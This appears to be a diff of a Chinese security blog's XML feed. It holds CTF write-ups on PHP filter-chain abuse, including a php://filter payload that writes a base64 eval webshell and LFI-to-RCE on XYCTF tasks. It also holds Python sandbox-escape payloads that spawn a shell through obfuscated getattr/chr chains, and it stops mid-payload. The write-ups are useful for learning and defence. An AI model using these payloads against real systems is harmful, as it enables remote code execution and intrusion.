+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522212950464.png" alt="image-20240522212950464"></p>
+<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522213035987.png" alt="image-20240522213035987"></p>
+<p>参考文章：</p>
+<p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p>
+<p><code>https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</code></p>
+<p><code>https://blog.csdn.net/woshilnp/article/details/117266628</code></p>
+<h3 id="利用filter-chain生成任意字符"><a href="#利用filter-chain生成任意字符" class="headerlink" title="利用filter chain生成任意字符"></a>利用filter chain生成任意字符</h3><p>所以这里就利用了filter链的构造，详细看这个项目：</p>
+<p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
+<p>当然也有可以直接用来梭的脚本：</p>
+<p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<h5 id="php-temp"><a href="#php-temp" class="headerlink" title="php:&#x2F;&#x2F;temp"></a>php:&#x2F;&#x2F;temp</h5><p>这里说明一个知识点，temp和memory伪协议</p>
+<p><code>php://memory</code>和<code>php://temp</code>是一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是<code>php://memory</code>总是把数据储存在内存中，而<code>php://temp</code>的内存限制可通过田间<code>/maxmemory:NN</code>来控制，NN是以字节为单位、保留在内存的最大数据量，超过则使用临时文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fiveMBs</span> = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>;  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://temp/maxmemory:<span class="subst">$fiveMBs</span>&quot;</span>, <span class="string">&#x27;r+&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="string">&quot;hello\n&quot;</span>);  </span><br><span class="line"><span class="comment">// 读取写入的数据.  </span></span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>php://memory</code>和<code>php://temp</code>是一次性的，比如：当stream流关闭后，就无法再次得到以前的内容了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;PHP&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>); <span class="comment">// 啥也没有</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="如何构造"><a href="#如何构造" class="headerlink" title="如何构造"></a>如何构造</h5><p>由于PHP Filter的存在，我们可以利用一些操作来构造自己想要的内容。正好PHP Filter当中有一种<code>convert.iconv</code>的Filter，可以用来将数据从字符集A转换为字符集B。</p>
+<p>举个简单的例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;php://filter/convert.iconv.UTF-8/UTF-7/resource=data://,some&lt;&gt;text&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// some+ADwAPg-text 同时这里的data:,其实就是data伪协议，只是这里没有指定媒体类型，默认为text/plain;charset=US-ASCII，故只有后面的some&lt;&gt;text被转换了。</span></span><br></pre></td></tr></table></figure>
+
+<p>那么如何利用呢？</p>
+<p><strong>这里先说明一个技巧：</strong>当我们使用其他字符编码产生了不可见字符，并且对于PHP Base来说是非法字符（比如：$)C），那么此时我们只需要base64-decoded一下就可以去掉不可见字符了，但是与此同时，我们的C字符也也被 base64-decode解码了，这时候需要再把解码结果使用一次base64-encode即可还原回来原来的C字符，这样就可以留下我们想要的字符了。</p>
+<p>比如我们现在想要构造尖括号，因为base64编码合法字符里没有尖括号，所以不能直接产生PHP代码进行包含，但是可以通过上面的那个技巧来产生一个Base64字符串，最后再使用一次base64解码就可以产生了</p>
+<p>比如我们可以通过生成<code>PAaaaaa</code>，最后再经过Base64解码得到的字符为<code>&lt;</code>，后续为其他不需要的垃圾字符串。所以接下来需要做的，就是利用上面的技巧找到这么一类编码，可以只存在我们需要构造的一个webshell的base64字符串了。</p>
+<p>大概就是这个意思，直接看题，具体构造直接看下面的参考文章。</p>
+<h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>下面都是直接利用的这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
+<h6 id="用于文件包含"><a href="#用于文件包含" class="headerlink" title="用于文件包含"></a>用于文件包含</h6><p><strong>通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</strong>，比如XYCTF的题</p>
+<p><strong>ezLFI</strong></p>
+<p>题目描述：一句话木马？<br>——————</p>
+<p>有附件，可以知道index.php的内容为<code>&lt;?php include_once($_REQUEST[&#39;file&#39;]);</code>，waf了很多，这里可以通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</p>
+<p>项目地址：<code>https://github.com/synacktiv/php_filter_chain_generator</code>，直接利用这个脚本生成</p>
+<p>如下：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152334913.png" alt="image-20240527152334913"></p>
+<p>成功得到flag</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152405691.png" alt="image-20240527152405691"></p>
+<p><strong>这里可以利用的原因</strong>就在于<code>php://temp</code>，经过一系列过滤器处理后的数据被传递给了<code>php://temp</code>流，这意味着最终的数据被写入了一个临时文件中。这个临时文件中包含了经过处理的数据，由此可以用于文件包含。</p>
+<h6 id="用于构造任意字符串"><a href="#用于构造任意字符串" class="headerlink" title="用于构造任意字符串"></a>用于构造任意字符串</h6><p>其实本质和上面那个差不多，这里记录一下做法而已，对于为什么会在前面构造出想要的字符串，看参考文章。</p>
+<p><strong>连连看到底是连连什么看</strong></p>
+<p>题目描述：到底连连什么看才对呢？（flag在根目录&#x2F;flag下）</p>
+<p>——————</p>
+<p>开题就是一个小游戏，查看源码看到如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154205080.png" alt="image-20240527154205080"></p>
+<p>直接尝试文件包含<code>?file=/flag</code>,显示：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154253580.png" alt="image-20240527154253580"></p>
+<p>直接跳转到这个文件，得到php代码，如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时就需要借鉴这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
+<p>这里我们并不能保证<code>/etc/passwd</code>内容为想要的<code>XYCTF</code>，而且一般都不是，考点不会这么简单，这里估计想考的就是利用filter chain构造任意字符串，如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154613313.png" alt="image-20240527154613313"></p>
+<p>我们本地看看结果是什么</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174205087.png" alt="image-20240527174205087"></p>
+<p>可以看到确实成功构造出来了<code>XYCTF</code>，但是由于这里有垃圾数据，就需要用到上面说过的<code>string.strip_tags</code>来过滤掉垃圾数据，如下构造</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174836426.png" alt="image-20240527174836426"></p>
+<p>最终效果</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174418038.png" alt="image-20240527174418038"></p>
+<p>再传入题目中：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174628296.png" alt="image-20240527174628296"></p>
+<p>得到flag</p>
+<p>参考文章：</p>
+<p><code>https://tttang.com/archive/1395/</code></p>
+<p><code>https://probiusofficial.github.io/2023/02/07/Filter/#php-x2F-x2F-filter</code></p>
+<p><code>https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0</code></p>
+]]></content>
+      <categories>
+        <category>php相关漏洞</category>
+        <category>对php的filter过滤器利用总结</category>
+      </categories>
+  </entry>
+  <entry>
     <title>python沙箱逃逸</title>
     <url>/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
-    <content><![CDATA[<p>建议看了本篇文章后可以去打一打NSSCTF上的很多沙箱逃逸的题，加深理解，同时我也发布了持续更新中的做题集合。</p>
+    <content><![CDATA[<p>沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。</p>
 <span id="more"></span>
 
 <h3 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h3><p>沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。</p>
@@ -2016,469 +2482,245 @@
       </categories>
   </entry>
   <entry>
-    <title>session反序列化学习</title>
-    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>好用，爱用，多用</p>
+    <title>沙箱逃逸做题总结</title>
+    <url>/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>持续更新中</p>
 <span id="more"></span>
 
-<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
-<p><strong>PHP session：</strong></p>
-<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
-<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
-<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
-<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="calc-jail-beginner-JAIL"><a href="#calc-jail-beginner-JAIL" class="headerlink" title="calc_jail_beginner(JAIL)"></a>calc_jail_beginner(JAIL)</h3><p>无过滤</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure>
 
-<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
-<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
-<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601191148423.png" alt="image-20240601191148423"></p>
+<h3 id="calc-jail-beginner-level1-JAIL"><a href="#calc-jail-beginner-level1-JAIL" class="headerlink" title="calc_jail_beginner_level1(JAIL)"></a>calc_jail_beginner_level1(JAIL)</h3><p>题目给了源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`ib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">  ...  </span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
 
+<p>过滤了字符 <code>&quot;</code>， <code>&#39;</code>， <code> 反引号</code>， <code>i</code>， <code>b</code>这几个字符串，可以使用ssti，但是这里过滤了i和b字符和引号，在翻看笔记的过程中，发现了一个<code>getattr</code>函数，先看一看笔记：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
 
+<p>其实就是获取a的属性b，<strong>可以用于继承链</strong>，如下：</p>
+<p>但是这里过滤了引号，使用<code>chr()</code>函数（对应ascii），可以用脚本生成：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chr_converter</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(<span class="string">f&#x27;chr(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>)&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">input_str = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(chr_converter(input_str))</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>session.save_handler&#x3D;””</li>
-</ul>
-<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
-<ul>
-<li><strong>session.serialize_handler</strong></li>
-</ul>
-<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
-<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
-<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
-<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
-<p>并且文件的内容始终是session值的序列化之后的内容。</p>
-<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>
+<p>最终如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(().__class__.__mro__[<span class="number">1</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()</span><br></pre></td></tr></table></figure>
 
-<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
-<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
-<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
-<ul>
-<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
-</li>
-<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
-</li>
-</ul>
-<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考文章1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
-<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th>处理器名称</th>
-<th>存储格式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>php</td>
-<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
-</tr>
-<tr>
-<td>php_binary</td>
-<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
-</tr>
-<tr>
-<td>php_serialize</td>
-<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
-</tr>
-</tbody></table>
-<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
-<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
-<p>测试一下，demo如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601204517815.png" alt="image-20240601204517815"></p>
+<p>成功执行，可以知道os模块为倒数第四个，那么由于不能直接将chr()用于继承链（会报错），所以需要套，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(().__class__.__mro__[<span class="number">1</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()[-<span class="number">4</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))</span><br><span class="line"><span class="comment">#__init__</span></span><br></pre></td></tr></table></figure>
 
+<p>成功：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601204922973.png" alt="image-20240601204922973"></p>
+<p>这样套就行，最终想要使用的payload为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
+<p>构造出来如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(<span class="built_in">getattr</span>(().__class__.__mro__[<span class="number">1</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()[-<span class="number">4</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span 